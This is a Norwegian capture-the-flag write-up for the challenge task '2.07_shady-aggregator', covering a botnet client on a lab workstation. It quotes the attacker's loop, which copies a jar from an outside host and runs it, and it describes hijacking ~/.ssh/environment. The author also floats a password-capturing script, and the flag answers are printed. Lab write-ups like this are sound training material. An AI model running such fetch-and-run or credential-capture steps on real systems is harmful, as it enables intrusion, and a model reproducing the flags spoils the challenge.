# 2.07_shady-aggregator

Ser en ekstern ip på `pwr-ws-caf5db` kjører `.client` i java. Killer jeg den kommer den tilbake. Sjekker prosessen for detaljer

```bash
user@pwr-ws-caf5db ~> ls -lah /proc/8548/
total 0
# fjernet overflødig
lrwxrwxrwx   1 user user 0 Jan  2 17:47 cwd -> /tmp/.tmp/
# fjernet overflødig

user@pwr-ws-caf5db ~> ls -lah /tmp/.tmp/
total 20K
drwxr-xr-x 1 user user  51 Jan  2 17:49 ./
drwxrwxrwt 1 root root  80 Jan  2 17:34 ../
-rw-r--r-- 1 user user 11K Jan  2 17:34 .client
-rw-r--r-- 1 user user 202 Jan  2 17:55 .config
-rw-r--r-- 1 user user  22 Jan  2 17:55 .output
```

Strings på `.config` viser: http://shady-aggregator.utl/

Ser ut som java kommandoen blir kjørt eksternt (typ: `ssh host java -jar .client`). Killer jeg den ser det ut som et script som restarter følgende sekvens: (skrev `ps -aux` veldig fort og fulgte med)

```
scp archive@shady-aggregator:client .client
pkill -f java -jar .client
java -jar .client
```

Ved kjapp kikk på `ps -aux` ser jeg også at den kjører `/usr/bin/ssh-askpass`. Strings på denne viser et skjult flagg:

```
This binary is not intended to be exploited.
Please pretend that it is a real ssh-askpass :)
But you can have an extra flag: 4bab5fe81da1f4e26a8d91e5360039b3
```

Ser også at denne blir satt i `~/.ssh/enviroment` så jeg endrer denne til å peke til `/tmp/test.sh`. I dette bash scriptet har jeg absolutt ingenting, og når jeg da dreper den eksisterende mux og java kommando med følgende:

```
ps -aux | egrep "shady|\.client" | head -n 2 | awk '{print $2}' | xargs kill
```

Så neste gang den angriperen kjører så kan jeg også koble til shady-aggregator med: `ssh archive@shady-aggregator`. Jeg aner ikke hvordan! :) Der ligger dog FLAGG så jeg skriver det inn:

```
Kategori: 2. Oppdrag
Oppgave:  2.07_shady-aggregator
Svar:     98f39fbbb757ad4911567c9a9b5ed3bf
Poeng:    10

Utmerket! Denne maskinen administrerer et botnett.

Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
```

Til info, tanken min om test.sh var å prøve å lage noe som spurte om f.eks passord og lagret det i en tekst fil og sendte videre til ssh-askpass, da jeg ikke helt vet hva ssh-askpass gjør. Men ser ut som jeg fikk det til på pure luck.

# Skjult flagg

```
Kategori: 4. Skjulte flagg
Oppgave:  4.1_askpass
Svar:     4bab5fe81da1f4e26a8d91e5360039b3
Poeng:    0

Gratulerer, korrekt svar!
```